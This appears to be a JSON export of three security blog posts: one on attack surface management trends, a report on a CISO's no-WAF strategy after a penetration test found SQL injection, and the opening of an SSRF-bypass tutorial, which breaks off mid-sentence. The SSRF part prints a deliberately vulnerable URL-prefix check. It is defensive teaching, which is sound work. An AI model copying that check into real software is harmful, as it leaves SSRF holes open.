[{"content":"PDF Open (new tab): /files/ASM_Hype_vs_Reality.pdf If the PDF does not render, open it here: /files/ASM_Hype_vs_Reality.pdf\nVideo Attack Surface Management in 2025: Why Continuous Visibility is Essential Attack surfaces have exploded in 2025. With cloud, SaaS, IoT, and remote work dissolving the traditional network perimeter, organizations now face a sprawling map of assets ‚Äì from web apps and APIs to shadow IT and third-party services ‚Äì all of which could be entry points for attackers[1][2]. Adversaries are leveraging automation and AI to scan for misconfigurations and forgotten domains in seconds, often finding weaknesses ‚Äúlong before defenders even know those assets exist‚Äù[2]. In this environment, visibility is the new battleground: you simply ‚Äúcannot defend what you cannot see‚Äù[3].\nWhy Attack Surface Management Matters More Than Ever Continuous Attack Surface Management (ASM) has shifted from a nice-to-have to a must-have security practice in 2025[4]. The reasons are clear:\nDigital Expansion \u0026amp; Shadow Assets: Businesses are rapidly moving operations online and deploying new digital services. Every new cloud instance, SaaS app, IoT device, or vendor integration extends the attack surface[5]. Many of these assets live outside traditional monitoring, creating visibility gaps where breaches begin[5]. For example, multi-cloud adoption is now the norm ‚Äì 92% of enterprises use multiple clouds, bringing tremendous complexity and risk if not continuously mapped[6].\nDynamic Environments: The attack surface isn‚Äôt static. Cloud workloads spin up and down daily; developers push new APIs and microservices; employees connect from everywhere. Traditional periodic audits miss these rapid changes. Attackers count on this drift ‚Äì unpatched test servers, orphaned domains, and leaked credentials are prime targets. Continuous ASM closes this window by discovering and monitoring assets in real time, so exposures are caught and fixed before attackers exploit them[7][8]. As one survey noted, security teams are moving from reactive to proactive ‚Äì over 70% of businesses now spend more on tools that provide real-time visibility and continuous monitoring rather than just after-the-fact defenses[9][10].\nAdvanced Threats \u0026amp; AI-Driven Attacks: Threat actors in 2025 are automating reconnaissance and using AI to identify cracks in your exterior faster than ever[2]. They don‚Äôt ask if you have a weakness, but where. This makes shrinking unknown attack surface crucial. Notably, even well-secured organizations are challenged by emerging vectors like APIs ‚Äì 99% of companies experienced at least one API security incident in the past year, often from hidden or unmanaged APIs[11]. Injection flaws and broken authorization in APIs accounted for over one-third of those incidents, and 95% of API attacks used valid credentials (attackers piggybacking on authenticated sessions)[12]. In short, attackers find ways in through any unattended door. ASM‚Äôs job is to lock those doors by illuminating every asset and vulnerability.\nCompliance and Trust: Regulators and stakeholders now expect rigorous attack surface oversight. New regulations (e.g. SEC cyber disclosure rules in the U.S., the EU‚Äôs NIS2 directive) mandate continuous asset monitoring and prompt incident reporting[13]. Losing track of your digital footprint not only invites breaches but also violations, penalties, and reputational damage. Organizations are responding by treating ASM as a business imperative to demonstrate proactive risk management[14]. It‚Äôs no surprise that the ASM market is booming ‚Äì valued around $856.5 million in 2024, it‚Äôs projected to reach $4.3 billion by 2032 (22.6% CAGR)[15] ‚Äì reflecting how essential continuous visibility has become.\nKey Trends in Attack Surface Management for 2025 Staying ahead of attackers requires adapting to the latest trends in ASM. Here are the top trends shaping attack surface management in 2025:\nAI-Powered ASM Solutions: Artificial intelligence and machine learning are now integral to ASM. Modern platforms use AI to automatically discover assets and prioritize risks, sifting real threats from noise. This enables finding subtle vulnerabilities that humans might overlook[16]. For example, an AI-driven ASM tool helped a global bank identify over 1,000 misconfigured cloud storage buckets within hours, averting a potential breach of millions of records[17]. In 2025, expect AI to play an even larger role in predictive analysis ‚Äì anticipating attack paths before they‚Äôre exploited[18].\nIntegration with Zero Trust: Zero Trust Architecture (ZTA) ‚Äì ‚Äúnever trust, always verify‚Äù ‚Äì has become a standard cybersecurity framework, and ASM is being woven into it[19]. ASM feeds continuous asset insights into zero trust enforcement, ensuring that every device, user, and service is verified and monitored. By integrating with zero trust policies, organizations make sure no part of the attack surface goes unchecked[20]. This tight coupling means even as your environment changes, your security stance remains vigilant.\nFocus on IoT and OT Security: The rise of Internet of Things (IoT) and operational technology (OT) devices has ‚Äúdramatically expanded the attack surface‚Äù[21]. Everything from smart sensors in factories to connected medical devices can introduce new vulnerabilities. In 2025, ASM tools are placing special emphasis on discovering and securing these devices. They scan for issues like default passwords, outdated firmware, or open connections in IoT/OT equipment[22]. As more critical infrastructure comes online, identifying and hardening IoT/OT assets is a key ASM priority.\nCloud-Native and Multi-Cloud Coverage: With most organizations operating in hybrid and multi-cloud environments, cloud-native ASM solutions have gained traction[23]. These tools integrate directly with cloud platforms (AWS, Azure, GCP, etc.) to continuously inventory cloud instances, storage buckets, serverless functions, and more. They help enforce security and compliance across complex, distributed cloud setups[23]. A notable example is a global e-commerce firm that used a cloud-focused ASM tool to catch misconfigurations across AWS, Azure, and GCP ‚Äì preventing a potential leak of millions of transaction records by fixing an S3 bucket exposure in time[24]. Given that 92% of enterprises now embrace multi-cloud strategies[6], having ASM that spans all cloud environments is now essential.\nProactive Threat Intelligence Integration: ASM platforms are no longer working in isolation ‚Äì they are integrating real-time cyber threat intelligence (CTI) feeds to add context to discovered vulnerabilities[25]. By correlating asset data with threat intel (e.g. dark web chatter, emerging exploit trends), ASM can prioritize issues based on likely attack scenarios. This trend enables smarter triage: teams get alerts not just that a system is exposed, but whether that exposure is being actively targeted in the wild[26][27]. For instance, during a late-2024 supply chain attack on a software vendor, an ASM tool with threat intel integration helped downstream customers quickly identify which of their assets were affected and patch them within hours[25]. In 2025, threat intelligence-powered ASM means faster, more informed decision-making about what to fix first.\nThird-Party Risk Monitoring: Organizations have learned the hard way that their security is only as strong as their weakest vendor or partner. Third-party risk management (TPRM) has thus become a critical extension of attack surface management[28]. Leading ASM solutions now monitor the security posture of vendors, suppliers, and other external partners ‚Äì essentially mapping your partners‚Äô attack surfaces as part of your own. KuppingerCole analysts note that TPRM capabilities are ‚Äúnow a crucial component of ASM,‚Äù needed to assess and mitigate risks from third-party providers[28]. For example, in 2024 a retailer discovered a vulnerability in a payment processor‚Äôs system using its ASM platform, allowing them to fix the issue before it turned into a major breach[29]. In 2025, continuous digital supply chain visibility is no longer optional.\nShift from Reactive to Proactive Defense: Traditional vulnerability management was often reactive ‚Äì find a flaw, then fix it (often after an incident). ASM in 2025 emphasizes proactive defense[30]. This means continuously looking for exposures before there‚Äôs a known exploit or compromise, and addressing them in near real-time. Modern ASM platforms offer continuous monitoring, real-time alerts, and even automated remediation of simple issues. The goal is to shorten the exposure window dramatically, so that even if new vulnerabilities appear (e.g. an expired certificate or an open port), they are quickly detected and resolved. Over half of security teams report that inconsistent or delayed handling of such issues has caused deployment delays and incidents ‚Äì hence the push for ASM-driven continuous validation and rapid fix cycles[31].\nHuman-Centric Workflows: Despite increasing automation, human expertise remains vital in ASM. Leading solutions focus on being human-centric ‚Äì presenting findings in clear, prioritized ways and integrating with workflows that security teams use[32]. Rather than overwhelm analysts with thousands of scan results, smart ASM tools collapse duplicates and highlight what truly matters (e.g. an unknown asset with high business impact). They route issues to the right owner with context for a fix. By empowering security teams with intuitive dashboards and actionable insights, ASM combines machine efficiency with human judgment. This helps organizations maintain a sharp security posture without drowning in noise[32].\nWhat Organizations Expect from ASM (2025 Survey Insights) Industry surveys show that organizations in 2025 have high expectations for their ASM programs. A SANS Institute survey of 235 security leaders revealed several key priorities[33][34]:\nBroad Asset Coverage: 55% of organizations want their ASM to cover both external and internal assets, not just the internet-facing footprint[34]. This aligns with the rise of combined External ASM (EASM) and Cyber Asset ASM (CAASM) strategies for unified visibility.\nRisk Quantification: 89% expect risk scoring or quantification for each asset discovered[35][34]. In practice, this means ASM tools should translate raw vulnerabilities into business risk metrics (e.g. high/medium/low risk ratings) so teams can focus on what‚Äôs truly critical.\nActionable Guidance: 67% want actionable mitigation guidance built-in, especially when a vulnerability has a public exploit available[36]. Rather than just flagging a CVE, ASM solutions are expected to tell teams how to remediate or at least link to fix information.\nContinuous Validation: 47% are integrating ASM with penetration testing or red teaming efforts to continuously validate that exposures are truly closed[37]. This points to a trend of using ASM data in purple teaming ‚Äì constantly testing and improving one‚Äôs security from an attacker‚Äôs perspective.\nData Sensitivity Awareness: A glaring gap identified is that only 28% of ASM tools effectively identify sensitive data across the attack surface[38]. Organizations want ASM to not just find assets, but also indicate if those assets contain critical data (PII, customer info, etc.), which would elevate their priority. This remains an area for improvement in many solutions.\nIn summary, businesses are looking for comprehensive, intelligent, and integrated ASM capabilities that can bridge visibility gaps between IT, security, and risk teams. The days of run-and-dump scanning are over ‚Äì modern ASM is expected to be continuous, contextual, and tightly aligned with mitigation workflows.\nThe Evolving ASM Solution Landscape Given the demand, the vendor landscape for attack surface management has become highly competitive in 2025[39]. Both established cybersecurity companies and innovative startups are vying to provide complete ASM solutions:\nEstablished Leaders: Major security providers have heavily invested in ASM features. For example, Palo Alto Networks offers Cortex Xpanse (born from their Expanse acquisition) to help large enterprises map all internet-facing assets[40]. Rapid7, known for vulnerability management, has incorporated external attack surface discovery into its Insight platform[41]. IBM entered the space by acquiring Randori (an ASM startup), signaling a serious focus on ASM capabilities[39]. Another top player is Bitsight, which KuppingerCole recognized as an Overall Leader in ASM for the second year running[42][43]. Bitsight‚Äôs platform stands out for combining external asset discovery, cyber threat intelligence, dynamic risk scoring, and third-party risk monitoring in one solution[43][44]. Analysts noted that such integrated offerings ‚Äì spanning EASM, CAASM, supply chain risk, and even security ratings ‚Äì make a compelling one-stop ASM approach[44].\nFast-Rising Startups: Alongside the big names, several specialist vendors are gaining traction with innovative approaches. CyCognito is one such startup, known for using outside-in reconnaissance to find an organization‚Äôs unknown or forgotten assets (their true external presence)[45]. NopSec takes a hacker‚Äôs perspective, focusing on prioritizing exploitable exposures so teams know which holes to patch first[45]. Another is Assetnote, which offers continuous asset discovery particularly suited for agile DevOps environments where things change frequently[46]. These newer entrants often differentiate on faster deployment, ease of use, and aggressive innovation in niche areas (like finding shadow IT or integrating developer-friendly workflows). They underscore that the ASM market isn‚Äôt static ‚Äì it‚Äôs evolving quickly with new ideas.\nIt‚Äôs worth noting that many ASM capabilities are also being integrated into broader security platforms. Cloud providers now offer basic external asset scanning, and several vulnerability management and SIEM vendors have added ASM modules to give a more complete risk picture. The bottom line is that organizations have a range of options ‚Äì from standalone ASM platforms to all-in-one cyber risk management suites ‚Äì and the best choice depends on their size, needs, and existing toolstack.\nConclusion Attack Surface Management in 2025 remains sharp and mission-critical. The expansion of digital business, combined with faster and smarter attackers, means that companies can no longer afford blind spots. ASM provides the continuous ‚Äúradar‚Äù needed to spot exposed assets and vulnerabilities across all environments before attackers do. The latest trends show ASM becoming more intelligent (with AI and threat intel), more encompassing (covering cloud, IoT, third parties), and more proactive (aiming to fix issues before they lead to incidents).\nOrganizations investing in these capabilities are seeing tangible benefits: shorter exposure windows, fewer breach incidents, and improved confidence from customers and regulators. In an era where your attack surface changes by the minute, continuously managing it is the only way to stay secure. As one security expert put it, ‚ÄúAttack surfaces are growing faster than ever. Security leaders need clarity, not noise.‚Äù[47] ASM done right delivers that clarity ‚Äì turning an overwhelming map of assets into a prioritized action plan for defense. By embracing cutting-edge ASM tools and practices, businesses can keep their guard up and maintain the edge in cybersecurity going forward.\nSources:\nPuppyGraph Blog ‚Äì Attack Surface Management: Complete 2025 Guide (Nov 2025)[48][49] SANS 2025 Survey (via Netwrix) ‚Äì Attack Surface \u0026amp; Vulnerability Management Key Takeaways[34] CybelAngel ‚Äì The API Threat Report: What 2025 Has Taught Us So Far[50][12] ThreatMon ‚Äì Attack Surface Visibility in 2025: Why It Matters More Than Ever[1][3] FortifyData ‚Äì Attack Surface Management Market Size \u0026amp; Trends 2025[15][9] Cyble ‚Äì Top Attack Surface Management Trends for 2025[16][51] Bitsight (KuppingerCole Leadership Compass 2025 insights)[26][28] Bitsight Press Release ‚Äì Recognized as Leader in 2025 ASM Compass[43][44] ","permalink":"https://windshock.github.io/en/post/2025-12-22-attack-surface-management-in-2025-why-continuous-visibility-is-essential/","summary":"Why continuous visibility and attack surface management (ASM) are essential in 2025, with key trends, survey insights, and practical takeaways.","title":"Attack Surface Management in 2025: Why Continuous Visibility is Essential"},{"content":"Preface: The Crack Between Philosophy and Execution First half of 202x. When the group‚Äôs penetration test report stated, ‚ÄúSQL Injection possible in WAF-unprotected section,‚Äù the CISO was silent for a while. The report was blunt, the attack was classic, and there was no defense.\n\u0026ldquo;Was I wrong? Or did they misunderstand my intention\u0026hellip;?\u0026rdquo;\nThe CISO was a leader of strong conviction. He believed that with a strategy of ‚ÄúIPS + security by design,‚Äù it was possible to build a system robust enough to forgo WAF deployment. In fact, for years, this strategy contributed to the organization‚Äôs threat detection and incident prevention.\nBut external economic crises and internal restructuring changed the landscape. Company-wide budget cuts followed, and security assessment budgets that were less visible and not directly linked to incidents became the easiest target. The CISO chose to reduce the overall security budget by a set percentage, and slashed the assessment budget to a fraction.\nAfter that, vulnerability metrics were no longer raised. He went so far as to prohibit the quantification of vulnerability metrics, shifting to a system where only \u0026lsquo;assessment plans\u0026rsquo; were reported. It was a declaration of faith in philosophy over data.\nBut there was no longer a system to verify if that philosophy worked. And now, a single SQL Injection was toppling philosophy, execution, and trust.\nLeadership Diagnosis: The Triple Gap Between Philosophy, Reality, and Execution 1. Philosophical Conviction: The Strategy that IPS Alone Is Enough The CISO believed that, through Snort-based IPS rule tuning and secure development processes, most of the functions offered by a WAF could be replaced by the organization‚Äôs own technical execution. In the short term, this did yield positive results in terms of efficiency and cost.\nBut reality was different. Encrypted HTTPS traffic, HTTP parameter tampering, and L7 dynamic requests left attack surfaces that IPS could not structurally cover, creating not a replacement for WAF, but a gap.\n2. Real-World Constraints: Budget Cuts and Strategic Choices From the second half of 202x, a corporate management crisis forced the CISO to make tough choices. The overall security budget was hard to touch, so assessment budgets, seen as low risk, became the first to be cut.\nExternal assessments ‚Üí switched to internal checks Assessment frequency ‚Üí limited to once a year or on exception basis Vulnerability metrics ‚Üí stopped collecting quantitative data, focused on plans only These measures brought short-term cost savings but cut off systematic risk measurement and remediation.\n3. The Illusion of Execution: Failure of Security Embedding Security guides were distributed and some automated tools deployed, but security by design never truly took root. There was no integration with CI/CD pipelines, training was one-off, and developers still saw security as ‚Äúsomeone else‚Äôs problem.‚Äù\nIn short, there was an SDLC only on paper, but no organizational consensus to drive execution.\nConclusion: Philosophy Was Not Wrong, But Philosophy Without Execution Is Not Strategy The CISO built a strategy on security philosophy, but failed to fully consider what was needed for that strategy to work in reality‚Äîorganizational capability, execution systems, and cultural foundation. In the end, philosophy without execution cannot be strategy, and that gap becomes a real security risk.\nPhilosophy must persuade reality. Strategy must be measurable. Execution must align with organizational culture. What‚Äôs needed now is not to abandon the philosophy, but to revive the conditions for it to work.\nReport: Assessment of Web Application Defense Strategy and Recommendations 1. Introduction The recent penetration test that uncovered a web application vulnerability raises important questions about the real-world suitability of our defense strategy. The CISO has long maintained the philosophy that ‚Äúwe can defend without specific WAF solutions.‚Äù This was based on careful judgment of the limitations and cost-effectiveness of such solutions. However, this exposure suggests the strategy was not fully implemented or operationalized in practice. This report re-examines the issue from a field perspective and proposes ways to improve our web security strategy, serving as a comprehensive response to the CISO‚Äôs inquiry.\nAs former Seongnam Mayor (now President) Lee Jae-myung‚Äôs leadership motto goes, ‚ÄúThe answer is in the field.‚Äù No matter how great the strategy or philosophy, if it doesn‚Äôt block real attacks, it‚Äôs useless. This incident shows how our security philosophy is tested by real-world attack scenarios, providing a chance to recognize and learn from the gap between strategy and reality. Below, we analyze the background and intent of the strategy, review current operational limitations, and suggest future responses.\n2. Philosophy and Intent of the Web Application Defense Strategy There were several philosophical and practical reasons for the CISO‚Äôs reluctance to adopt a specific web application firewall solution:\nPursuit of Security Fundamentals: The belief that raising the security level of the application itself and eliminating vulnerabilities during development is the fundamental solution, rather than relying on specific security appliances. Signature-based solutions can create a false sense of security and may be powerless against new or obfuscated attacks. The CISO‚Äôs philosophy was to focus on root causes by strengthening secure development. Alternative Controls: Instead of deploying a specific WAF, the strategy was to block malicious traffic at the network level (firewall, IPS) and address application security through secure coding guidelines and regular code vulnerability analysis (SAST). Additional measures included secure server/database configurations (e.g., stored procedures, ORM). The aim was to offset the lack of a WAF by reinforcing Secure SDLC and fostering a DevSecOps culture. Cost and Operational Efficiency: Commercial WAFs were seen as having uncertain ROI, with high initial and operational costs, and often being poorly tuned or left in monitoring mode due to false positives. With limited budget, the organization prioritized core security infrastructure and secure development training over WAFs. In summary, the CISO‚Äôs strategy was a bold attempt to secure the system without relying on a specific WAF solution. This philosophy is echoed by parts of the industry, such as OWASP, which stresses secure coding and input validation as more fundamental than WAFs (see OWASP SQL Injection Prevention Cheat Sheet). The intent was not neglect, but to strengthen defense by other means.\n3. Current Security Operations: The Gap Between Strategy and Reality Despite the ideal strategy, a review of real-world operations reveals shortcomings in the implementation of the CISO‚Äôs philosophy. Key points:\nNetwork-Perimeter Focus: Firewalls and Snort-based IPS are deployed to block known attacks, but without a web application firewall, there is limited filtering of HTTP/S payloads. Snort IPS rules cover basic web attack patterns, but are weak against obfuscated or novel attacks. Insufficient Application Security Checks: Secure coding guides were distributed, but Secure SDLC was not strictly followed, and code reviews/static analysis were inconsistent. Regular vulnerability assessments were limited to a few key services, with many web services rarely tested, leaving potential vulnerabilities exposed. Lack of Monitoring and Response: There is no SIEM or centralized log monitoring, so abnormal web app activity is not detected in real time. No EDR or behavior-based detection means slow response to incidents. There is a lack of visibility and response capability. Limited Security Personnel: Security staff are few, with 24√ó7 monitoring outsourced to an MSSP. There is a lack of web app specialists and digital forensics skills, limiting advanced attack detection and analysis. Patch and Management Process: Security patching is done quarterly, making rapid response to zero-day or urgent issues difficult and increasing exposure time. Overall, operations are focused on the network perimeter, with insufficient application-level defense. The promised compensating controls for not having a WAF‚Äîstronger development security, improved monitoring‚Äîhave not been fully realized. In short, there is a gap between strategy and execution.\nReviewing the SQL Injection scenario: the attacker injected malicious payloads into input fields, using encoding to bypass filters. The system failed to block these, and sensitive data was extracted from the database. Application-level filtering (WAF or input validation) could have blocked this. Snort IPS did not detect the attack, and no alerts were raised. This shows the missing link in our security chain.\n4. Penetration Test Results: Validating the Strategy Hypothesis The vulnerability exposed by the recent penetration test highlighted the weaknesses of our security strategy. Key findings:\nImpact of Missing WAF: Malicious input reached the server unimpeded. A WAF could have blocked or alerted on basic web attack patterns. Cloud-based WAAP services can quickly update rules for new attacks. In our case, the lack of a web-level defense allowed easy webshell upload and database access‚Äîlike leaving the door unlocked. Limits of Network Security Devices: Snort IPS did not detect the attack, likely due to obfuscated payloads or use of HTTPS. IPS relies on known signatures, which can be bypassed by splitting keywords, changing case, or using special characters. IPS alone cannot cover all web attacks. Weak Input Validation: There was no server-side validation or parameter binding in the code. Secure coding was not enforced, and vulnerabilities were not caught in development. Delayed Response Due to Lack of Monitoring: The attack went unnoticed until the penetration test report. With SIEM or monitoring, abnormal queries or access patterns could have triggered alerts. The lack of such systems left us exposed for too long. In short, the test disproved the assumption that ‚Äúwe can be safe without a specific WAF solution‚Äù under current conditions. The compensating controls were not implemented, and the absence of a WAF left a gap. This is a meaningful finding, as it was a real-world test of our defenses.\nThis is not a rare case‚Äîweb app vulnerabilities remain common and dangerous. For example, the 2024 Edgescan Vulnerability Statistics Report found that 19.47% of critical web app vulnerabilities were SQL Injection (CWE-89). Attackers use automation to target many sites, and those without proper defenses are easy prey. This is an industry-wide risk, not just our problem.\n5. Re-evaluating the WAF: Its Role and Limitations As the CISO noted, a WAF is not a panacea. But current trends show that WAFs (and their evolution, WAAP) remain an important defense layer. Key points:\nValue of a WAF: WAFs can immediately block common attacks (SQLi, XSS, file uploads). Vendors provide urgent rule updates for new threats, and custom rules can be tuned to the application. Cloud WAFs/WAAPs leverage threat intelligence to cover new attack trends. WAFs serve as the last line of defense for vulnerabilities missed in development. Realistic Limitations: Signature-based WAFs can be bypassed by clever attackers using encoding, splitting, or mimicking normal traffic. Tuning and maintenance are required, with risks of false positives and service disruption. WAFs are not ‚Äúperfect shields‚Äù and must be used alongside other controls. Evolution to WAAP: Modern WAAP solutions integrate WAF, API security, bot mitigation, and DDoS protection as cloud services, suitable for API-driven architectures. WAAPs offer flexible, ML-based defenses and can be adopted selectively, without heavy initial investment. Cases Without WAF: Some global firms operate successfully without a WAF, but only with strong security teams, behavior-based detection, and custom tools. Our organization lacks such resources, so a balanced approach is needed. In summary, WAFs are essential for broad web services, but are only effective when combined with secure coding, vulnerability management, and monitoring. We must avoid both distrust and overreliance on WAFs, and seek optimal use for our environment.\n6. Leadership Perspective: Improving Strategy Through Field Validation The security strategy under the CISO‚Äôs leadership was meaningful and ambitious. Now, it‚Äôs time to improve it with field validation and feedback. As President Lee Jae-myung said, ‚ÄúThe answer is in the field.‚Äù The success or failure of our strategy depends on execution in the field.\nListening to the Field: Security and development staff expressed regret during the test‚Äî\u0026ldquo;If only we had a WAF\u0026hellip;\u0026rdquo; Developers wondered why such mistakes remained in the code. Their voices should be reflected in strategy adjustments. Flexible Adjustment: Philosophy is important, but must not become rigid dogma. The CISO‚Äôs philosophy can be preserved while addressing weaknesses exposed by this incident‚Äîby adopting new approaches or services that do not violate core principles. Raising Awareness: This incident should raise security awareness among developers and operators. The CISO‚Äôs philosophy must be shared, and the reasons for not adopting a WAF, and what must be done instead, should be explained. Security training and sharing recent attack cases are key leadership roles. Continuous Improvement Cycle: Strategy, operation, feedback, and improvement must cycle rapidly. Even minor incidents should be analyzed and addressed quickly. Regular tabletop exercises and penetration tests should be led by the CISO to find and fix weaknesses. Ultimately, leadership is about realizing philosophy in reality. If the CISO‚Äôs philosophy is right, leadership means building the execution roadmap and organizational capabilities to support it. Field feedback should be used as a compass for strategy development.\n7. Strategy Supplementation: Realistic Alternatives and Reinforcements To continue a security strategy without a specific WAF, compensating measures are essential. Considering the CISO‚Äôs reluctance to adopt WAAP, RASP, or a specific WAF, here are some possible alternatives and reinforcements:\n1. Use Cloud-Based Security Services (Selective Functions): Instead of traditional on-prem WAFs, consider partial adoption of Cloud WAAP, which can filter attacks by routing traffic through the cloud, allowing selection of only needed functions. Start in monitoring mode, tune, then switch to blocking mode for high-risk attacks. This approach is OPEX-based, with flexible contracts, reducing CISO‚Äôs burden. 2. Open-Source WAF Tools (e.g., ModSecurity): ModSecurity can be deployed in front of web servers, using the OWASP Core Rule Set. Skilled engineers can tune it to near-commercial effectiveness. If lacking expertise, start with a pilot and evaluate results. 3. Application Security Reinforcement (WAF Alternatives): Instead of a WAF, use runtime security and code hardening (e.g., RASP, live patching, allow-list validation for DB queries). These methods may impact performance or development workload, but solve problems internally without external appliances. 4. Security Architecture Redesign (Long-Term): Modernize web architecture (e.g., microservices, API gateways, Zero Trust), and leverage cloud provider security features. This is a long-term project, but can realize the security philosophy in a more sophisticated way. 5. Maintain Current Strategy + Minor Improvements (Passive): Simply reinforcing developer training, IPS rules, and patch cycles is not enough. This is not recommended, as it amounts to accepting risk and may cause accountability issues in future incidents. In summary, combine lightweight measures (1‚Äì3) in the short term, and pursue structural improvements (4) over the long term. The goal is to respect the CISO‚Äôs philosophy while reducing real-world risks.\n8. Stepwise Execution Roadmap Here is a proposed stepwise roadmap for implementing the above alternatives. Immediate, mid-term, and long-term actions are separated:\nShort Term (Immediate ~ 3 months):\nUrgent Web Application Patch: Patch the newly found vulnerability. Parameterize all DB queries, use ORM, and block queries with malicious characters. Audit other pages for similar issues. Cloud WAAP Pilot: Adopt a cloud WAAP service for major web traffic. Operate in monitoring mode for 1‚Äì2 months, collect data, tune rules, then gradually switch to blocking mode for critical attacks. Log Monitoring Enhancement: Build a temporary dashboard (e.g., ELK Stack) to unify logs from web servers, DB, and IPS, and monitor for missed patterns or future attacks. Goal: Quickly restore confidence that ‚Äúno more data leaks‚Äù will occur.\nMid Term (3‚Äì6 months):\nBuild Secure SDLC: Add security gates to the development process. Run SAST in the code management pipeline, block builds for critical findings, and require secure coding training for new developers. Run DAST quarterly on key services. Enhance Monitoring and Response: Deploy SIEM or, if budget is tight, at least aggregate logs for correlation. Refine SOC service SLAs and establish an incident response playbook. Pilot New Technologies: Test RASP or ModSecurity on small-scale services, measure performance impact, and evaluate suitability before broader adoption. Goal: Ensure ‚Äúvulnerabilities are filtered in development and remaining threats are detected and blocked in operation.‚Äù\nLong Term (6+ months):\nModernize Architecture and Infrastructure: Move toward microservices, apply least privilege, centralize authentication, and leverage cloud-native security features. Establish DevSecOps culture. Secure Talent: Hire or train web security architects and incident responders. If hiring is difficult, seek regular external consulting. Continuous Testing: Regularly run red team/blue team exercises and annual external penetration tests. Goal: Achieve ‚Äúsecurity regardless of whether a specific WAF solution is in place,‚Äù and build true cyber resilience.\nReferences \u0026amp; Further Reading üì∑ Leadership in Action:\nLee Jae-myung‚Äôs open-door mayoral office ‚Äî a symbolic gesture of field-first leadership\n‚Üí https://x.com/Jaemyung_Lee/status/1451461913288724483\nüìñ Theoretical Foundation:\n‚ÄúDefining the Strategic Role of the Chief Information Security Officer‚Äù\n‚Äî Sean B. Maynard et al. (2018)\n‚Üí https://www.researchgate.net/publication/331168444_Defining_the_Strategic_Role_of_the_Chief_Information_Security_Officer\nAs Onibere et al. insightfully noted:\n‚ÄúStrategic failure in cybersecurity often stems not from ignorance, but from the mismatch between vision and operational reality.‚Äù\nüî¨ Technical Reference:\n‚ÄúComparative approach to web application firewalls‚Äù ‚Äî Z. Ghanbari et al. (2015)\n‚Üí https://www.researchgate.net/publication/304416570_Comparative_approach_to_web_application_firewalls\n","permalink":"https://windshock.github.io/en/post/2025-06-30-ciso-strategy-execution/","summary":"\u003ch2 id=\"preface-the-crack-between-philosophy-and-execution\"\u003ePreface: The Crack Between Philosophy and Execution\u003c/h2\u003e\n\u003cp\u003eFirst half of 202x.\nWhen the group‚Äôs penetration test report stated, ‚ÄúSQL Injection possible in WAF-unprotected section,‚Äù the CISO was silent for a while.\nThe report was blunt, the attack was classic, and there was no defense.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u0026ldquo;Was I wrong? Or did they misunderstand my intention\u0026hellip;?\u0026rdquo;\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eThe CISO was a \u003cstrong\u003eleader of strong conviction\u003c/strong\u003e.\nHe believed that with a strategy of ‚ÄúIPS + security by design,‚Äù it was possible to build a system robust enough to forgo WAF deployment. In fact, \u003cstrong\u003efor years, this strategy contributed to the organization‚Äôs threat detection and incident prevention\u003c/strong\u003e.\u003c/p\u003e","title":"The Gap Between CISO Strategy and Execution: The WAF Debate and Field Leadership Report"},{"content":" No Silver Bullet: Folklore \u0026amp; Modern Meaning\nThe phrase \u0026ldquo;no silver bullet\u0026rdquo; originated in European folklore, where silver bullets were believed to be uniquely effective against supernatural creatures like werewolves or vampires. The earliest documented use appears in Walter Scott\u0026rsquo;s 1816 Tales of My Landlord, and historical cases such as the 1765 Beast of G√©vaudan reference silver bullets as a last resort against mysterious threats. Over time, the expression evolved: today, \u0026ldquo;no silver bullet\u0026rdquo; means there is no single, simple solution to complex problems‚Äîa message popularized in software engineering by Fred Brooks\u0026rsquo; 1986 essay. This post applies that lesson to SSRF defense: beware of one-size-fits-all fixes, and look deeper than folklore or quick patches.\nThe Limitations of ‚ÄúSecure‚Äù SSRF Patches: Advanced Bypasses and Defense-in-Depth Introduction: Understanding SSRF and Its Risks Server-Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to trick a server into making HTTP requests to unintended locations. In a typical SSRF attack, the adversary supplies a URL or address that the server-side code fetches ‚Äì but instead of fetching an expected external resource, the server is coerced into contacting internal services or protected endpoints not normally accessible to the attacker. This can lead to serious consequences: attackers may scan internal networks, access database endpoints, or retrieve cloud instance metadata (like AWS EC2 tokens) by exploiting SSRF. It‚Äôs no surprise SSRF has earned a spot in the OWASP Top 10 (2021) and is a growing concern for developers.\n‚ÄúJust use startsWith('https://trusted.com') to block SSRF!‚Äù\n‚Äî Common advice on StackOverflow (that fails in practice)\nBecause of its severity, many developers reach for quick patch methods to fix SSRF vulnerabilities. But as the quote above shows, well-intentioned advice often leads to incomplete or bypassable defenses. A quick search online yields plenty of code snippets and StackOverflow answers claiming to ‚Äúfix‚Äù SSRF by filtering URLs, enforcing domain allowlists, etc. In theory, these patches intend to restrict outgoing requests to safe targets. In practice, however, many commonly shared SSRF fixes are incomplete‚Äîthey cover basic cases but don‚Äôt hold up against advanced bypass techniques.\nIn this post, you‚Äôll learn:\nWhy ‚Äúsecure‚Äù SSRF patches often fail in real-world scenarios How attackers bypass naive defenses with creative payloads How to build robust, layered SSRF defenses in Node.js (Express + Axios) Practical test strategies and a hands-on SSRF Defense Lab By the end, you‚Äôll know how to spot incomplete SSRF fixes, understand advanced bypass tricks, and implement defense-in-depth that holds up under real attack. Security requires continuous testing and iterative hardening‚Äîbut with the right approach, you can stay a step ahead of attackers.\nCommon SSRF Patch Methods (and Why They Fall Short) Developers under pressure to patch an SSRF bug often implement quick solutions that seem to work. Some of the most common SSRF mitigation patterns include:\nAllowlisting by URL Prefix or Hostname Substring ‚Äì e.g. only fetch URLs that start with a specific domain. Basic Hostname Validation ‚Äì e.g. parse the user-supplied URL and ensure the hostname equals an expected value. Blocking Private IP Address Ranges by String ‚Äì e.g. reject any URLs containing 127.0.0.1 or localhost. Filtering Schemes ‚Äì e.g. only allow http:// or https:// URLs, and block others (FTP, file, etc.). Not Following Redirects ‚Äì or so one hopes (some fixes assume no redirects without enforcing it). Superficial Checks for Malicious Patterns ‚Äì e.g. disallow file:// in the URL, or attempts to sniff out hex/encoded IPs in the string. On paper, these measures sound reasonable. In practice, attackers have developed numerous tricks to evade such filters. Let‚Äôs examine a few pitfalls in naive SSRF defenses and how exploiters get around them:\n1. Na√Øve Domain Allowlisting via Prefix Matching One common approach is to allow requests only to a specific trusted domain or base URL. The code might do something like:\n// ‚ùå Vulnerable SSRF check (naive allowlist by prefix) if (!userUrl.startsWith(allowedBaseUrl)) { throw new Error(\u0026#34;URL not allowed\u0026#34;); } This looks straightforward ‚Äì if the user-provided URL doesn‚Äôt begin with say, 